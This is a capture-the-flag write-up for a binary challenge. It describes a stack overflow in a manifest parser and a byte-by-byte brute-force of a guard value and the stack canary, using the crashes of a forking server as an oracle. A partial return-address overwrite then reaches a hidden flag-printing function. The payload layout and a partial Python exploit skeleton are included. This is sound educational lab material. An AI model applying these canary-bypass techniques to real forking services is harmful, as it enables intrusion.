# IDA 4/4 — Manifest Lock

**Flag:** `reentry{the_crash_is_the_oracle}`

| | |
|---|---|
| Category | pwn / reverse engineering · 442 pts |
| Service | `nc 0.cloud.chals.io 12574` (forking server, port 9000 inside the container; offline now) |
| Files | [files/manifest-lock](files/manifest-lock) (ELF64, PIE, stripped, links `libcrypto.so.3`), [files/MANIFEST_FORMAT.md](files/MANIFEST_FORMAT.md) |

> **Challenge brief:** MERIDIAN's cargo lock will not list what it is holding until it is handed a
> manifest it recognises. Every manifest carries a seal, and the lock keeps the only copy of what
> the seal is cut against. So forge one. Thirty-two bytes stand between you and the crate index —
> work out how the seal is derived, cut your own, and the lock will open its index to you. Or find
> out what else the lock will accept.

---

## 1. Recon

On connect, the service sends a banner and prompt:

```
MERIDIAN CARGO LOCK  manifest interface  rev 4.2
cycle <n>   faults <m>
>
```

Commands: `LOAD <manifest>`, `LIST`, `STAT`, `HELP`, `QUIT`. `LIST` needs a prior accepted
`LOAD`, and even then returns only a **decoy** crate index with a fake seal
`reentry{manifest_listed_not_unsealed}`.

The brief points two ways:
- *"work out how the seal is derived, cut your own"* — the hard path (forge a seal).
- *"or find out what else the lock will accept"* — the intended path (a bug).
- The real flag is a **sealed value**, not the contents of `LIST`.

### Manifest format

`<manifest>` is custom base32 (5 bits/char, MSB first, `=` padding ignored). The alphabet is **not**
RFC 4648 — it sits in the binary at `0x2440`:

```
7Q2WE8RT4YU1IO9PA5SD3FG6HJ0KLZXC
```

Manifest body (little-endian, unaligned):

| Offset | Size | Field |
|---|---|---|
| `0` | 4 | magic `MRDN` |
| `4` | 2 | crate count |
| `6` | 2 | `name_len` |
| `8` | `name_len` | name |
| `8+name_len` | 32 | seal |

### Seal

The verify function (`0x13eb`) computes `seal = HMAC-SHA256(key, body[0 .. 8+name_len])`, where
`key` is **32 random bytes** from `/dev/urandom` at start-up (`0x5060`), never transmitted.
Forging the seal without the key is infeasible — a dead end.

> **Verification note (static):** On `files/manifest-lock` I confirmed it is a PIE x86-64 ELF
> linking `libcrypto.so.3`, and that the base32 alphabet `7Q2WE8RT4YU1IO9PA5SD3FG6HJ0KLZXC` and the
> strings `-- sealed value --`, `seal mismatch`, and the banner are present. The forking service is
> offline, so the live byte-by-byte attack cannot be reproduced now.

---

## 2. Memory map (from static analysis)

| Address | Content |
|---|---|
| `0x4040` | base32 decode buffer (global, ~4096 B, index ≤ `0xfff`) |
| `0x5048` | `faults` counter |
| `0x504c` | `cycle` number (from env `LOCK_CYCLE`) |
| `0x5060` | **HMAC key** (32 B from `/dev/urandom`) |
| `0x5080` | **guard** (8 B from `/dev/urandom`) — used as a canary for the name field |
| `0x5088` | flag length |
| `0x50a0` | **sealed value / FLAG** (from env `FLAG` or `flag.txt`, max 255 B) |

### Hidden "win" function — `0x18ee`

Just after the connection handler is a function **nobody calls**:

```asm
18f4:  lea  rsi, [rip+0x7aa]   ; "-- sealed value --\n"
18fb:  mov  edi, 1
1900:  call <print>
1905:  mov  edx, [rip# 5088]   ; flag length
192a:  lea  rsi, [rip# 50a0]   ; FLAG buffer
1934:  mov  edi, 1
1939:  call write              ; write(stdout, flag, len)
1920/1957: _exit(0)
```

It prints `-- sealed value --` and the **flag** straight to the socket. This is the **ret2win**
target.

---

## 3. Vulnerability — stack overflow in `LOAD`

In the manifest handler (`0x13eb`):

```asm
; name_len read as 16-bit LE from buf[6..7] -> r12d (0..65535)
1552:  lea  rdi, [rsp+0x10]        ; 64-byte name buffer
1557:  movsxd rdx, r12d            ; size = name_len
155a:  lea  rsi, [rip# 4048]       ; source = buf+8 (name)
1561:  call memcpy                 ; <<< overflow: up to 65535 B into a 64 B buffer
```

Frame layout (after `sub rsp,0x98`, prolog pushes r13/r12/rbp/rbx):

| Off from name | Element |
|---|---|
| `0` | name buffer (64 B) |
| `64` | **guard** (copy of `0x5080`) |
| `80` | HMAC output |
| `120` | **stack canary** (`fs:0x28`) |
| `168` | **return address** (→ want `0x18ee`) |

Verified empirically: `name_len = 64` → `seal mismatch` (guard intact); `name_len = 65` →
connection dies (guard overwritten → `_exit(2)`).

### Two barriers

1. **Guard** (`0x1566`): `cmp rbp, [rsp+0x50]` — mismatch → `_exit(2)`. Checked **before** HMAC.
2. **Stack canary** (`0x1664`): checked in the epilogue — mismatch → `__stack_chk_fail` (abort).

To overwrite the return address, you must get past **both** (memcpy is contiguous — it overwrites
the guard and canary on the way).

---

## 4. The breakthrough — "the crash is the oracle"

The key fact about the server (`main`): `accept() → fork() → child handles one connection`.

- Each connection is a **separate child** made by `fork()`.
- `fork()` **inherits the parent's memory**, so the **guard and canary are identical** in every
  child within one "cycle".
- A wrong guess → `_exit(2)` or abort → the connection dies; a correct one → execution continues
  (`seal mismatch` + a new prompt).

That is a **crash/survive oracle** that breaks the secrets **one byte at a time**:

- **Guard (8 B, offset 64):** for position `i`, send `64×filler + known[0:i] + guess`, length
  `64+i+1`. Only bytes `0..i` of the guard are overwritten; bytes `i+1..7` keep the real value.
  The qword compare passes only for the correct byte → connection survives = hit.
- **Canary (8 B, offset 120):** same idea, but first set the **correct guard** to pass barrier 1,
  then guess the canary bytes. The low byte of the canary is the classic `0x00` (glibc).
- **PIE on the return address:** the real return address is `base + 0x17c0`, the target is
  `base + 0x18ee`. Both are on the **same 0x1000 page** (they differ only in the low 12 bits,
  which ASLR does not touch). So a **partial 2-byte overwrite**: byte 0 = `0xee`, byte 1 has an
  unknown top nibble (bits 12–15 of base) → brute-force 16 values (`R<<4 | 0x8`).

### Final payload (`name_len = 176`)

```
[  0: 64] filler
[ 64: 72] guard   (recovered)
[ 72:120] filler
[120:128] canary  (recovered)
[128:168] filler  (saved registers)
[168:170] 0xee, (R<<4|0x8)   ; low 2 bytes of the return address -> 0x18ee
```

The seal can be anything — `seal mismatch` does **not** stop execution (it only prints a message),
so the function reaches the hijacked `ret` → jump to `0x18ee` → the flag goes to the socket.

---

## 5. Exploit robustness

- **Recycling:** after `0xfff = 4095` faults the server `execv`s itself — new key, guard, canary,
  and `cycle++`. One full solve is ~2000 faults, so it fits in a cycle; if a recycle happens
  mid-run, the exploit detects the `cycle` change in the banner and restarts on the fresh cycle.
  The flag was caught on **cycle 2** (`guard = 0b90591248b4f868`, `canary = 00cf6bc55d78c469`).
- **Throttling:** the remote proxy throttles bursts of connections. Solution: distinguish "bad
  guess" (banner received, then disconnect) from "connection error" (no banner) and retry the
  latter, plus moderate parallelism (`CHUNK=16`) with a re-sweep as a safety net.

---

## 6. Result

```
seal mismatch
-- sealed value --
reentry{the_crash_is_the_oracle}
```

🚩 **Flag:** `reentry{the_crash_is_the_oracle}`

The flag name confirms the technique: an oracle built from the crashes of a forking server.

---

## 7. Exploit skeleton (Python)

```python
TAB = "7Q2WE8RT4YU1IO9PA5SD3FG6HJ0KLZXC"

def b32(data):
    bits = nbits = 0; out = []
    for byte in data:
        bits = (bits << 8) | byte; nbits += 8
        while nbits >= 5:
            nbits -= 5; out.append(TAB[(bits >> nbits) & 0x1f])
    if nbits:
        out.append(TAB[(bits << (5 - nbits)) & 0x1f])
    return "".join(out)

def body(name, name_len=None, seal=b"\x00"*32, count=1):
    name_len = len(name) if name_len is None else name_len
    return (b"MRDN" + count.to_bytes(2,"little") + name_len.to_bytes(2,"little") + name + seal)

# Oracle: send LOAD <b32(body)>, True if the connection survived (reply ends with "> ").
# 1) brute guard  (offset 64)  byte by byte
# 2) brute canary (offset 120) byte by byte, with the correct guard
# 3) final payload name_len=176, retaddr = 0xee + brute(16) of the top nibble -> 0x18ee
# Handle recycling (cycle change in the banner) by restarting on a fresh cycle.
```

> **Previous:** [3 - CXTEA-F](3%20-%20CXTEA-F.md)
>
> **IDA: 4/4 — COMPLETE.** 🏁
